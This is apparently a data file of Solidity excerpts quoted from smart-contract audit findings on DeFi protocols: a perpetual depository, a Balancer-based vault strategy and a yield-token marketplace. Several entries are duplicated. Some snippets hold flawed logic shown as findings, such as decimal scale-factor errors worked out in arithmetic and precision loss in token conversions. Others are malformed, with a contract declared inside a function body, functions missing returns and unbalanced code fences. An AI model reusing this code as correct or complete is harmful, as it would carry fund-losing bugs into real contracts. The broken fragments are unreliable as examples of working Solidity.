"```\nfunction withdrawInsurance(uint256 amount, address to)\n    external\n    nonReentrant\n    onlyOwner\n{\n    if (amount == 0) {\n        revert ZeroAmount();\n    }\n\n    insuranceDeposited -= amount;\n\n    vault.withdraw(insuranceToken(), amount);\n    IERC20(insuranceToken()).transfer(to, amount);\n\n    emit InsuranceWithdrawn(msg.sender, to, amount);\n}\n```"
"```\nfunction getPositionValue() public view returns (uint256) {\n    uint256 markPrice = getMarkPriceTwap(15);\n    int256 positionSize = IAccountBalance(clearingHouse.getAccountBalance())\n       .getTakerPositionSize(address(this), market);\n    return markPrice.mulWadUp(_abs(positionSize));\n}\n\nfunction getMarkPriceTwap(uint32 twapInterval)\n    public\n    view\n    returns (uint256)\n{\n    IExchange exchange = IExchange(clearingHouse.getExchange());\n    uint256 markPrice = exchange\n       .getSqrtMarkTwapX96(market, twapInterval)\n       .formatSqrtPriceX96ToPriceX96()\n       .formatX96ToX10_18();\n    return markPrice;\n}\n```"
"```\nfunction _depositAsset(uint256 amount) private {\n    netAssetDeposits += amount;\n\n    IERC20(assetToken).approve(address(vault), amount);\n    vault.deposit(assetToken, amount);\n}\n```\n```\nfunction _withdrawAsset(uint256 amount, address to) private {\n    if (amount > netAssetDeposits) {\n        revert InsufficientAssetDeposits(netAssetDeposits, amount);\n    }\n    netAssetDeposits -= amount;\n\n    vault.withdraw(address(assetToken), amount);\n    IERC20(assetToken).transfer(to, amount);\n}\n```"
"```\nfunction sendFrom(\n    address _from,\n    uint16 _dstChainId,\n    bytes calldata _toAddress,\n    uint _amount,\n    address payable _refundAddress,\n    address _zroPaymentAddress,\n    bytes calldata _adapterParams\n) public payable virtual override {\n    _send(\n        _from,\n        _dstChainId,\n        _toAddress,\n        _amount,\n        _refundAddress,\n        _zroPaymentAddress,\n        _adapterParams\n    );\n}\n```"
"```\nfunction beforeWithdraw(\n    uint256 assets,\n    uint256,\n    address\n) internal override {\n    if (totalUsdcBorrowed() > ((totalAssets() - assets) * maxUtilizationBps) / MAX_BPS)\n        revert MaxUtilizationBreached();\n\n    pool.withdraw(address(asset), assets, address(this));\n}\n```"
"```\nfunction withdrawInsurance(uint256 amount, address to)\n    external\n    nonReentrant\n    onlyOwner\n{\n    if (amount == 0) {\n        revert ZeroAmount();\n    }\n\n    insuranceDeposited -= amount;\n\n    vault.withdraw(insuranceToken(), amount);\n    IERC20(insuranceToken()).transfer(to, amount);\n\n    emit InsuranceWithdrawn(msg.sender, to, amount);\n}\n```"
"```\nfunction getPositionValue() public view returns (uint256) {\n    uint256 markPrice = getMarkPriceTwap(15);\n    int256 positionSize = IAccountBalance(clearingHouse.getAccountBalance())\n       .getTakerPositionSize(address(this), market);\n    return markPrice.mulWadUp(_abs(positionSize));\n}\n\nfunction getMarkPriceTwap(uint32 twapInterval)\n    public\n    view\n    returns (uint256)\n{\n    IExchange exchange = IExchange(clearingHouse.getExchange());\n    uint256 markPrice = exchange\n       .getSqrtMarkTwapX96(market, twapInterval)\n       .formatSqrtPriceX96ToPriceX96()\n       .formatX96ToX10_18();\n    return markPrice;\n}\n```"
"```\npragma solidity ^0.8.0;\n\ncontract PerpDepository {\n    function rebalanceLite(\n        uint256 amount,\n        int8 polarity,\n        uint160 sqrtPriceLimitX96,\n        address account\n    ) external nonReentrant returns (uint256, uint256) {\n        if (polarity == -1) {\n            return _rebalanceNegativePnlLite(amount, sqrtPriceLimitX96, account);\n        } else if (polarity == 1) {\n            revert PositivePnlRebalanceDisabled(msg.sender);\n        } else {\n            revert InvalidRebalance(polarity);\n        }\n    }\n\n    function _rebalanceNegativePnlLite(\n        uint256 amount,\n        uint160 sqrtPriceLimitX96,\n        address account\n    ) private returns (uint256, uint256) {\n        uint256 normalizedAmount = amount.fromDecimalToDecimal(\n            ERC20(quoteToken).decimals(),\n            18\n        );\n        _checkNegativePnl(normalizedAmount);\n        IERC20(quoteToken).transferFrom(account, address(this), amount);\n        IERC20(quoteToken).approve(address(vault), amount);\n        vault.deposit(quoteToken, amount);\n        bool isShort = false;\n        bool amountIsInput = true;\n        (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n            normalizedAmount,\n            isShort,\n            amountIsInput,\n            sqrtPriceLimitX96\n        );\n        vault.withdraw(assetToken, baseAmount);\n        IERC20(assetToken).transfer(account, baseAmount);\n        emit Rebalanced(baseAmount, quoteAmount, 0);\n        return (baseAmount, quoteAmount);\n    }\n}\n```\n```\nstruct InternalOpenPositionParams {\n    address trader;\n    address baseToken;\n    bool isBaseToQuote;\n    bool isExactInput;\n    bool isClose;\n    uint256 amount;\n    uint160 sqrtPriceLimitX96;\n}\n```"
"```\nfunction _rebalanceNegativePnlWithSwap(\n    uint256 amount,\n    uint256 amountOutMinimum,\n    uint160 sqrtPriceLimitX96,\n    uint24 swapPoolFee,\n    address account\n) private returns (uint256, uint256) {\n    uint256 normalizedAmount = amount.fromDecimalToDecimal(\n        ERC20(quoteToken).decimals(),\n        18\n    );\n\n    _checkNegativePnl(normalizedAmount);\n\n    bool isShort = false;\n    bool amountIsInput = true;\n\n    (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n        normalizedAmount,\n        isShort,\n        amountIsInput,\n        sqrtPriceLimitX96\n    );\n\n    vault.withdraw(assetToken, baseAmount);\n\n    SwapParams memory params = SwapParams({\n        tokenIn: assetToken,\n        tokenOut: quoteToken,\n        amountIn: baseAmount,\n        amountOutMinimum: amountOutMinimum,\n        sqrtPriceLimitX96: sqrtPriceLimitX96,\n        poolFee: swapPoolFee\n    });\n\n    uint256 quoteAmountOut = spotSwapper.swapExactInput(params);\n}"
"```\ncontract UXDGovernor is\n    ReentrancyGuard,\n    Governor,\n    GovernorVotes,\n    GovernorVotesQuorumFraction,\n    GovernorTimelockControl,\n    GovernorCountingSimple,\n    GovernorSettings\n```"
"```\nfunction _depositAsset(uint256 amount) private {\n    netAssetDeposits += amount;\n\n    IERC20(assetToken).approve(address(vault), amount);\n    vault.deposit(assetToken, amount);\n}\n```\n```\nfunction _rebalanceNegativePnlWithSwap(\n    uint256 amount,\n    uint256 amountOutMinimum,\n    uint160 sqrtPriceLimitX96,\n    uint24 swapPoolFee,\n    address account\n) private returns (uint256, uint256) {\n    (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n        normalizedAmount,\n        isShort,\n        amountIsInput,\n        sqrtPriceLimitX96\n    );\n    vault.withdraw(assetToken, baseAmount);\n    \n    vault.deposit(quoteToken, quoteAmount);\n\n    emit Rebalanced(baseAmount, quoteAmount, shortFall);\n    return (baseAmount, quoteAmount);\n}\n```\n```\nfunction _rebalanceNegativePnlLite() public {\n    contract PerpDepository {\n        (uint256 baseAmount, uint256 quoteAmount) = _placePerpOrder(\n            normalizedAmount,\n            isShort,\n            amountIsInput,\n            sqrtPriceLimitX96\n        );\n        vault.withdraw(assetToken, baseAmount);\n    }\n```"
"```\nfunction deposit(\n    address asset,\n    uint256 amount\n) external onlyController returns (uint256) {\n    if (asset == assetToken) {\n        _depositAsset(amount);\n        (, uint256 quoteAmount) = _openShort(amount);\n        return quoteAmount;\n    } else if (asset == quoteToken) {\n        return _processQuoteMint(amount);\n    } else {\n        revert UnsupportedAsset(asset);\n    }\n}"
"```\nfunction _placePerpOrder(\n    uint256 amount,\n    bool isShort,\n    bool amountIsInput,\n    uint160 sqrtPriceLimit\n) private returns (uint256, uint256) {\n    uint256 upperBound = 0; // 0 = no limit, limit set by sqrtPriceLimit\n\n    IClearingHouse.OpenPositionParams memory params = IClearingHouse.OpenPositionParams({\n        baseToken: market,\n        isBaseToQuote: isShort, // true for short\n        isExactInput: amountIsInput, // we specify exact input amount\n        amount: amount, // collateral amount - fees\n        oppositeAmountBound: upperBound, // output upper bound\n        deadline: block.timestamp,\n        sqrtPriceLimitX96: sqrtPriceLimit, // max slippage\n        referralCode: 0x0\n    });\n\n    (uint256 baseAmount, uint256 quoteAmount) = clearingHouse.openPosition(params);\n\n    uint256 feeAmount = _calculatePerpOrderFeeAmount(quoteAmount);\n    totalFeesPaid += feeAmount;\n\n    emit PositionOpened(isShort, amount, amountIsInput, sqrtPriceLimit);\n    return (baseAmount, quoteAmount);\n}\n\nfunction _calculatePerpOrderFeeAmount(uint256 amount) internal view returns (uint256) {\n    return amount.mulWadUp(getExchangeFeeWad());\n}\n```"
"```\nfunction _depositAsset(uint256 amount) private {\n    netAssetDeposits += amount;\n\n    IERC20(assetToken).approve(address(vault), amount);\n    vault.deposit(assetToken, amount);\n}\n```\n```\nfunction _withdrawAsset(uint256 amount, address to) private {\n    if (amount > netAssetDeposits) {\n        revert InsufficientAssetDeposits(netAssetDeposits, amount);\n    }\n    netAssetDeposits -= amount;\n\n    vault.withdraw(address(assetToken), amount);\n    IERC20(assetToken).transfer(to, amount);\n}\n```"
"```\nfunction sellUnderlying(\n    address u,\n    uint256 m,\n    uint128 a,\n    uint128 s\n) external returns (uint128) {\n    IPool pool = IPool(pools[u][m]);\n\n    uint128 expected = pool.sellBasePreview(a);\n\n    if (expected < s) {\n        revert Exception(16, expected, 0, address(0), address(0));\n    }\n\n    Safe.transferFrom(IERC20(pool.base()), msg.sender, address(pool), a);\n}\n\nfunction sellPrincipalToken(\n    address u,\n    uint256 m,\n    uint128 a,\n    uint128 s\n) external returns (uint128) {\n    IPool pool = IPool(pools[u][m]);\n\n    uint256 expected = pool.sellFYTokenPreview(a);\n\n    if (expected < s) {\n        revert Exception(16, expected, s, address(0), address(0));\n    }\n\n    Safe.transferFrom(\n        IERC20(address(pool.fyToken())),\n        msg.sender,\n        address(pool),\n        a\n    );\n}\n```\nvm.startPrank(address(token));\n\nIERC20(Contracts.USDC).approve(address(marketplace), type(uint256).max);\n\nIERC20(Contracts.YIELD_TOKEN).approve(\n    address(marketplace),\n    type(uint256).max\n)\n```"
"```\nlibrary Stable2TokenOracleMath {\n    using TypeConvert for int256;\n    using Stable2TokenOracleMath for StableOracleContext;\n\n    function _getSpotPrice(\n        StableOracleContext memory oracleContext, \n        TwoTokenPoolContext memory poolContext, \n        uint256 primaryBalance,\n        uint256 secondaryBalance,\n        uint256 tokenIndex\n    ) internal view returns (uint256 spotPrice) {\n        require(tokenIndex < 2);\n\n        uint256 scaledPrimaryBalance = primaryBalance * poolContext.primaryScaleFactor / BalancerConstants.BALANCER_PRECISION;\n        uint256 scaledSecondaryBalance = secondaryBalance * poolContext.secondaryScaleFactor / BalancerConstants.BALANCER_PRECISION;\n\n        (uint256 balanceX, uint256 balanceY) = tokenIndex == 0? \n            (scaledPrimaryBalance, scaledSecondaryBalance) : \n            (scaledSecondaryBalance, scaledPrimaryBalance);\n\n        uint256 invariant = StableMath._calculateInvariant(\n            oracleContext.ampParam, \n            StableMath._balances(balanceX, balanceY), \n            true\n        );\n\n        spotPrice = StableMath._calcSpotPrice({\n            amplificationParameter: oracleContext.ampParam, \n            invariant: invariant, \n            balanceX: balanceX, \n            balanceY: balanceY\n        });\n\n        uint256 scaleFactor = tokenIndex == 0? \n            poolContext.secondaryScaleFactor * BalancerConstants.BALANCER_PRECISION / poolContext.primaryScaleFactor : \n            poolContext.primaryScaleFactor * BalancerConstants.BALANCER_PRECISION / poolContext.secondaryScaleFactor;\n        spotPrice = spotPrice * BalancerConstants.BALANCER_PRECISION / scaleFactor;\n    }\n}\n```\nscaleFactor = poolContext.secondaryScaleFactor * BalancerConstants.BALANCER_PRECISION / poolContext.primaryScaleFactor\nscaleFactor = (1e30 * 1e18) / 1e18\nscaleFactor = 1e30\n```\n```\nspotPrice = spotPrice * BalancerConstants.BALANCER_PRECISION / scaleFactor;\n\nspotPrice = (1e18 * 1e18) / 1e30\n\nspotPrice = 1e6\n```\n```\nscaleFactor = poolContext.secondaryScaleFactor * BalancerConstants.BALANCER_PRECISION / poolContext.primaryScaleFactor\nscaleFactor = (1e18 * 1e18) / 1e30\nscaleFactor = 1e6\n```\n```\nspotPrice = spotPrice * BalancerConstants.BALANCER_PRECISION / scaleFactor;\n\nspotPrice = (1e18 * 1e18) / 1e6\nspotPrice = 1e30\n```\n```\nuint256 oraclePrice = poolContext._getOraclePairPrice(strategyContext.tradingModule);\n```\n```\nfunction _getMinExitAmounts(\n    StableOracleContext calldata oracleContext,\n    TwoTokenPoolContext calldata poolContext,\n    StrategyContext calldata strategyContext,\n    uint256 oraclePrice,\n    uint256 bptAmount\n) internal view returns (uint256 minPrimary, uint256 minSecondary) {\n    uint256 spotPrice = _getSpotPrice({\n        oracleContext: oracleContext,\n        poolContext: poolContext,\n        primaryBalance: poolContext.primaryBalance,\n        secondaryBalance: poolContext.secondaryBalance,\n        tokenIndex: 0\n    });\n    _checkPriceLimit(strategyContext, oraclePrice, spotPrice);\n}"
"```\nfunction _calculateInvariant(\n    uint256 amplificationParameter,\n    uint256[] memory balances,\n    bool roundUp\n) internal pure returns (uint256) {\n    unchecked {\n        uint256 sum = 0;\n        uint256 numTokens = balances.length;\n        for (uint256 i = 0; i < numTokens; i++) {\n            sum = sum.add(balances[i]);\n        }\n        if (sum == 0) {\n            return 0;\n        }\n\n        uint256 prevInvariant = 0;\n        uint256 invariant = sum;\n        uint256 ampTimesTotal = amplificationParameter * numTokens;\n\n        for (uint256 i = 0; i < 255; i++) {\n            uint256 P_D = balances[0] * numTokens;\n            for (uint256 j = 1; j < numTokens; j++) {\n                P_D = Math.div(Math.mul(Math.mul(P_D, balances[j]), numTokens), invariant, roundUp);\n            }\n            prevInvariant = invariant;\n            invariant = Math.div(\n                Math.mul(Math.mul(numTokens, invariant), invariant).add(\n                    Math.div(Math.mul(Math.mul(ampTimesTotal, sum), P_D), _AMP_PRECISION, roundUp)\n                ),\n                Math.mul(numTokens + 1, invariant).add(\n                    // No need to use checked arithmetic for the amp precision, the amp is guaranteed to be at least 1\n                    Math.div(Math.mul(ampTimesTotal - _AMP_PRECISION, P_D), _AMP_PRECISION,!roundUp)\n                ),\n                roundUp\n            );\n\n            if (invariant > prevInvariant) {\n                if (invariant - prevInvariant <= 1) {\n                    return invariant;\n                }\n            } else if (prevInvariant - invariant <= 1) {\n                return invariant;\n            }\n        }\n    }\n    revert CalculationDidNotConverge();\n}\n```\n```\nfunction _getSpotPrice(\n    ThreeTokenPoolContext memory poolContext, \n    BoostedOracleContext memory oracleContext,\n    uint8 tokenIndex\n) internal pure returns (uint256 spotPrice) {\n    uint256[] memory balances = _getScaledBalances(poolContext);\n    uint256 invariant = StableMath._calculateInvariant(\n        oracleContext.ampParam, \n        balances, \n        true // roundUp = true\n    );\n```\n```\nfunction _getValidatedPoolData(\n    ThreeTokenPoolContext memory poolContext,\n    BoostedOracleContext memory oracleContext,\n    StrategyContext memory strategyContext\n) internal view returns (uint256 virtualSupply, uint256[] memory balances, uint256 invariant) {\n    (virtualSupply, balances) = \n        _getVirtualSupplyAndBalances(poolContext, oracleContext);\n\n    invariant = StableMath._calculateInvariant(\n        oracleContext.ampParam, \n        balances, \n        true // roundUp = true\n    );\n}\n```\n```\nfunction _calculateInvariant(uint256 amplificationParameter, uint256[] memory balances)\n    internal\n    pure\n    returns (uint256)\n{\n    // Always round down, to match Vyper's arithmetic (which always truncates).\n\n    uint256 sum = 0; // S in the Curve version\n    uint256 numTokens = balances.length;\n    for (uint256 i = 0; i < numTokens; i++) {\n        sum = sum.add(balances[i]);\n    }\n    if (sum == 0) {\n        return 0;\n    }\n    //..SNIP..\n}\n```"
"```\nint256 internal constant INTERNAL_TOKEN_PRECISION = 1e8;\nuint256 internal constant BALANCER_PRECISION = 1e18;\n```\n```\nfunction _convertBPTClaimToStrategyTokens(\n    StrategyContext memory context,\n    uint256 bptClaim\n) internal pure returns (uint256 strategyTokenAmount) {\n    if (context.vaultState.totalBPTHeld == 0) {\n        return (bptClaim * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / \n            BalancerConstants.BALANCER_PRECISION;\n    }\n\n    strategyTokenAmount = (bptClaim * context.vaultState.totalStrategyTokenGlobal) / context.vaultState.totalBPTHeld;\n}\n```\n```\nstrategyTokenAmount = (bptClaim * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / BalancerConstants.BALANCER_PRECISION\nstrategyTokenAmount = (bptClaim * 1e8) / 1e18\nstrategyTokenAmount = ((10 ** 10 - 1) * 1e8) / 1e18\n```\n```\nstrategyTokenAmount = (bptClaim * context.vaultState.totalStrategyTokenGlobal) / context.vaultState.totalBPTHeld;\nstrategyTokenAmount = (bptClaim * (x * 1e8)) / (y * 1e18)\n```\n```\nfunction _deposit(\n    ThreeTokenPoolContext memory poolContext,\n    StrategyContext memory strategyContext,\n    AuraStakingContext memory stakingContext,\n    BoostedOracleContext memory oracleContext,\n    uint256 deposit,\n    uint256 minBPT\n) internal returns (uint256 strategyTokensMinted) {\n    uint256 bptMinted = poolContext._joinPoolAndStake({\n        strategyContext: strategyContext,\n        stakingContext: stakingContext,\n        oracleContext: oracleContext,\n        deposit: deposit,\n        minBPT: minBPT\n    });\n\n    strategyTokensMinted = strategyContext._convertBPTClaimToStrategyTokens(bptMinted);\n\n    strategyContext.vaultState.totalBPTHeld += bptMinted;\n    strategyContext.vaultState.totalStrategyTokenGlobal += uint256(strategyTokensMinted);\n    strategyContext.vaultState.setStrategyVaultState();\n}\n```\nstrategyTokenAmount = (bptClaim * context.vaultState.totalStrategyTokenGlobal) / context.vaultState.totalBPTHeld;\nstrategyTokenAmount = (bptClaim * (10000 * 1e8)) / (10000 * 1e18);\nstrategyTokenAmount = (bptClaim * (1e12)) / (1e22);\n```"
"```\nfunction _convertStrategyTokensToBPTClaim(\n    StrategyContext memory context,\n    uint256 strategyTokenAmount\n) internal pure returns (uint256 bptClaim) {\n    require(strategyTokenAmount <= context.vaultState.totalStrategyTokenGlobal);\n    if (context.vaultState.totalStrategyTokenGlobal > 0) {\n        bptClaim = (strategyTokenAmount * context.vaultState.totalBPTHeld) / context.vaultState.totalStrategyTokenGlobal;\n    }\n}\n```\n```\nfunction _redeem(\n    ThreeTokenPoolContext memory poolContext,\n    StrategyContext memory strategyContext,\n    AuraStakingContext memory stakingContext,\n    uint256 strategyTokens,\n    uint256 minPrimary\n) internal returns (uint256 finalPrimaryBalance) {\n    uint256 bptClaim = strategyContext._convertStrategyTokensToBPTClaim(strategyTokens);\n\n    if (bptClaim == 0) {\n        return 0;\n    }\n\n    finalPrimaryBalance = _unstakeAndExitPool({\n        stakingContext: stakingContext,\n        poolContext: poolContext,\n        bptClaim: bptClaim,\n        minPrimary: minPrimary\n    });\n\n    strategyContext.vaultState.totalBPTHeld -= bptClaim;\n    strategyContext.vaultState.totalStrategyTokenGlobal -= uint256(strategyTokens);\n    strategyContext.vaultState.setStrategyVaultState();\n}\n```\nfunction redeemFromNotional(\n    address account,\n    address receiver,\n    uint256 strategyTokens,\n    uint256 maturity,\n    uint256 underlyingToRepayDebt,\n    bytes calldata data\n) external onlyNotional returns (uint256 transferToReceiver) {\n    uint256 borrowedCurrencyAmount = _redeemFromNotional(account, strategyTokens, maturity, data);\n\n    uint256 transferToNotional;\n    if (account == address(this) || borrowedCurrencyAmount <= underlyingToRepayDebt) {\n        transferToNotional = borrowedCurrencyAmount;\n    } else {\n        transferToNotional = underlyingToRepayDebt;\n        unchecked {\n            transferToReceiver = borrowedCurrencyAmount - underlyingToRepayDebt;\n        }\n    }\n\n    if (_UNDERLYING_IS_ETH) {\n        if (transferToReceiver > 0) payable(receiver).transfer(transferToReceiver);\n        if (transferToNotional > 0) payable(address(NOTIONAL)).transfer(transferToNotional);\n    } else {\n        if (transferToReceiver > 0) _UNDERLYING_TOKEN.checkTransfer(receiver, transferToReceiver);\n        if (transferToNotional > 0) _UNDERLYING_TOKEN.checkTransfer(address(NOTIONAL), transferToNotional);\n    }\n}\n```\nfunction _redeemStrategyTokensToCashInternal(\n    VaultConfig memory vaultConfig,\n    uint256 maturity,\n    uint256 strategyTokensToRedeem,\n    bytes calldata vaultData\n) private nonReentrant returns (int256 assetCashRequiredToSettle, int256 underlyingCashRequiredToSettle) {\n    if (vaultConfig.getFlag(VaultConfiguration.ALLOW_REENTRANCY)) {\n        reentrancyStatus = _NOT_ENTERED;\n    }\n\n    VaultState memory vaultState = VaultStateLib.getVaultState(vaultConfig.vault, maturity);\n    (int256 assetCashReceived, uint256 underlyingToReceiver) = vaultConfig.redeemWithoutDebtRepayment(\n        vaultConfig.vault,\n        strategyTokensToRedeem,\n        maturity,\n        vaultData\n    );\n    require(assetCashReceived > 0);\n    require(underlyingToReceiver == 0);\n\n    vaultState.totalAssetCash = vaultState.totalAssetCash.add(uint256(assetCashReceived));\n    vaultState.totalStrategyTokens = vaultState.totalStrategyTokens.sub(strategyTokensToRedeem);\n    vaultState.setVaultState(vaultConfig.vault);\n\n    emit VaultRedeemStrategyToken(vaultConfig.vault, maturity, assetCashReceived, strategyTokensToRedeem);\n    return _getCashRequiredToSettle(vaultConfig, vaultState, maturity);\n}\n```\n```\nfunction _redeem(\n    ThreeTokenPoolContext memory poolContext,\n    StrategyContext memory strategyContext,\n    AuraStakingContext memory stakingContext,\n    uint256 strategyTokens,\n    uint256 minPrimary\n) internal returns (uint256 finalPrimaryBalance) {\n    uint256 bptClaim = strategyContext._convertStrategyTokensToBPTClaim(strategyTokens);\n\n    if (bptClaim == 0) {\n        return 0;\n    }\n\n    finalPrimaryBalance = _unstakeAndExitPool({\n        stakingContext: stakingContext,\n        poolContext: poolContext,\n        bptClaim: bptClaim,\n        minPrimary: minPrimary\n    });\n\n    strategyContext.vaultState.totalBPTHeld -= bptClaim;\n    strategyContext.vaultState.totalStrategyTokenGlobal -= uint256(strategyTokens);\n    strategyContext.vaultState.setStrategyVaultState();\n}"
"```\nfunction _validateSpotPriceAndPairPrice(\n    StableOracleContext calldata oracleContext,\n    TwoTokenPoolContext calldata poolContext,\n    StrategyContext memory strategyContext,\n    uint256 oraclePrice,\n    uint256 primaryAmount,\n    uint256 secondaryAmount\n) internal view {\n    uint256 spotPrice = _getSpotPrice({\n        oracleContext: oracleContext,\n        poolContext: poolContext,\n        primaryBalance: poolContext.primaryBalance,\n        secondaryBalance: poolContext.secondaryBalance,\n        tokenIndex: 0\n    });\n\n    _checkPriceLimit(strategyContext, oraclePrice, spotPrice);\n\n    uint256 primaryPrecision = 10 ** poolContext.primaryDecimals;\n    uint256 secondaryPrecision = 10 ** poolContext.secondaryDecimals;\n    primaryAmount = primaryAmount * BalancerConstants.BALANCER_PRECISION / primaryPrecision;\n    secondaryAmount = secondaryAmount * BalancerConstants.BALANCER_PRECISION / secondaryPrecision;\n\n    uint256 calculatedPairPrice = _getSpotPrice({\n        oracleContext: oracleContext,\n        poolContext: poolContext,\n        primaryBalance: primaryAmount,\n        secondaryBalance: secondaryAmount,\n        tokenIndex: 0\n    });\n```\n```\nfunction _getSpotPrice(\n    StableOracleContext memory oracleContext, \n    TwoTokenPoolContext memory poolContext, \n    uint256 primaryBalance,\n    uint256 secondaryBalance,\n    uint256 tokenIndex\n) internal view returns (uint256 spotPrice) {\n    require(tokenIndex < 2);\n\n    uint256 scaledPrimaryBalance = primaryBalance * poolContext.primaryScaleFactor / BalancerConstants.BALANCER_PRECISION;\n    uint256 scaledSecondaryBalance = secondaryBalance * poolContext.secondaryScaleFactor / BalancerConstants.BALANCER_PRECISION;\n\n    (uint256 balanceX, uint256 balanceY) = tokenIndex == 0? \n        (scaledPrimaryBalance, scaledSecondaryBalance) : \n        (scaledSecondaryBalance, scaledPrimaryBalance);\n\n    uint256 invariant = StableMath._calculateInvariant(\n        oracleContext.ampParam, \n        StableMath._balances(balanceX, balanceY), \n        true // round up\n    );\n\n    spotPrice = StableMath._calcSpotPrice({\n        amplificationParameter: oracleContext.ampParam,\n        invariant: invariant,\n        balanceX: balanceX,\n        balanceY: balanceY\n    });\n\n    uint256 scaleFactor = tokenIndex == 0? \n        poolContext.secondaryScaleFactor * BalancerConstants.BALANCER_PRECISION / poolContext.primaryScaleFactor : \n        poolContext.primaryScaleFactor * BalancerConstants.BALANCER_PRECISION / poolContext.secondaryScaleFactor;\n    spotPrice = spotPrice * BalancerConstants.BALANCER_PRECISION / scaleFactor;\n}\n```\n/**\n * @dev Overrides scaling factor getter to introduce the tokens' price rate.\n * Note that it may update the price rate cache if necessary.\n */\nfunction _scalingFactors() internal view virtual override returns (uint256[] memory scalingFactors) {\n    scalingFactors = super._scalingFactors();\n    scalingFactors[0] = scalingFactors[0].mulDown(_priceRate(_token0));\n    scalingFactors[1] = scalingFactors[1].mulDown(_priceRate(_token1));\n}\n```\n```\nFixedPoint.ONE * 10 ** decimalsDifference\n1e18 * 1e12 = 1e30\n```\n```\n/**\n * @dev Returns a scaling factor that, when multiplied to a token amount for `token`, normalizes its balance as if\n * it had 18 decimals.\n */\nfunction _computeScalingFactor(IERC20 token) internal view returns (uint256) {\n    uint256 tokenDecimals = ERC20(address(token)).decimals();\n\n    // Tokens with more than 18 decimals are not supported.\n    uint256 decimalsDifference = 18 - tokenDecimals;\n    return FixedPoint.ONE * 10**decimalsDifference;\n}\n```"
"```\nfunction _getPoolParams(\n    TwoTokenPoolContext memory context,\n    uint256 primaryAmount,\n    uint256 secondaryAmount,\n    bool isJoin\n) internal pure returns (PoolParams memory) {\n    IAsset[] memory assets = new IAsset[](2);\n    assets[context.primaryIndex] = IAsset(context.primaryToken);\n    assets[context.secondaryIndex] = IAsset(context.secondaryToken);\n\n    uint256[] memory amounts = new uint256[](2);\n    amounts[context.primaryIndex] = primaryAmount;\n    amounts[context.secondaryIndex] = secondaryAmount;\n\n    uint256 msgValue;\n    if (isJoin && assets[context.primaryIndex] == IAsset(Deployments.ETH_ADDRESS)) {\n        msgValue = amounts[context.primaryIndex];\n    }\n\n    return PoolParams(assets, amounts, msgValue);\n}\n```\nfunction _joinPoolExactTokensIn(\n    PoolContext memory context,\n    PoolParams memory params,\n    uint256 minBPT\n) internal returns (uint256 bptAmount) {\n    bptAmount = IERC20(address(context.pool)).balanceOf(address(this));\n    Deployments.BALANCER_VAULT.joinPool{value: params.msgValue}(\n        context.poolId,\n        address(this),\n        address(this),\n        IBalancerVault.JoinPoolRequest(\n            params.assets,\n            params.amounts,\n            abi.encode(\n                IBalancerVault.JoinKind.EXACT_TOKENS_IN_FOR_BPT_OUT,\n                params.amounts,\n                minBPT, // Apply minBPT to prevent front running\n            ),\n            false // Don't use internal balances\n        )\n    );\n    bptAmount = IERC20(address(context.pool)).balanceOf(address(this)) - bptAmount;\n}\n```"
"```\nfunction getEmergencySettlementBPTAmount(uint256 maturity) external view returns (uint256 bptToSettle) {\n    Boosted3TokenAuraStrategyContext memory context = _strategyContext();\n    bptToSettle = context.baseStrategy._getEmergencySettlementParams({\n        maturity: maturity,\n        totalBPTSupply: IERC20(context.poolContext.basePool.basePool.pool).totalSupply()\n    });\n}\n```\n```\nfunction _getEmergencySettlementParams(\n    StrategyContext memory strategyContext,\n    uint256 maturity,\n    uint256 totalBPTSupply\n) internal view returns (uint256 bptToSettle) {\n    StrategyVaultSettings memory settings = strategyContext.vaultSettings;\n    StrategyVaultState memory state = strategyContext.vaultState;\n\n    uint256 emergencyBPTWithdrawThreshold = settings._bptThreshold(totalBPTSupply);\n\n    if (strategyContext.vaultState.totalBPTHeld <= emergencyBPTWithdrawThreshold) {\n        revert Errors.InvalidEmergencySettlement();\n    }\n}\n```\n```\nfunction _bptThreshold(\n    StrategyVaultSettings memory strategyVaultSettings,\n    uint256 totalBPTSupply\n) internal pure returns (uint256) {\n    return (totalBPTSupply * strategyVaultSettings.maxBalancerPoolShare) / BalancerConstants.VAULT_PERCENT_BASIS;\n}\n```"
"```\nint256 internal constant INTERNAL_TOKEN_PRECISION = 1e8;\nuint256 internal constant BALANCER_PRECISION = 1e18;\n```\n```\nfunction _convertStrategyTokensToBPTClaim(\n    StrategyContext memory context,\n    uint256 strategyTokenAmount\n) internal pure returns (uint256 bptClaim) {\n    require(strategyTokenAmount <= context.vaultState.totalStrategyTokenGlobal);\n    if (context.vaultState.totalStrategyTokenGlobal > 0) {\n        bptClaim = (strategyTokenAmount * context.vaultState.totalBPTHeld) / context.vaultState.totalStrategyTokenGlobal;\n    }\n}\n```\n```\nfunction _redeem(\n    ThreeTokenPoolContext memory poolContext,\n    StrategyContext memory strategyContext,\n    AuraStakingContext memory stakingContext,\n    uint256 strategyTokens,\n    uint256 minPrimary\n) internal returns (uint256 finalPrimaryBalance) {\n    uint256 bptClaim = strategyContext._convertStrategyTokensToBPTClaim(strategyTokens);\n\n    if (bptClaim == 0) {\n        return 0;\n    }\n\n    finalPrimaryBalance = _unstakeAndExitPool({\n        stakingContext: stakingContext,\n        poolContext: poolContext,\n        bptClaim: bptClaim,\n        minPrimary: minPrimary\n    });\n\n    strategyContext.vaultState.totalBPTHeld -= bptClaim;\n    strategyContext.vaultState.totalStrategyTokenGlobal -= uint256(strategyTokens);\n    strategyContext.vaultState.setStrategyVaultState();\n}"
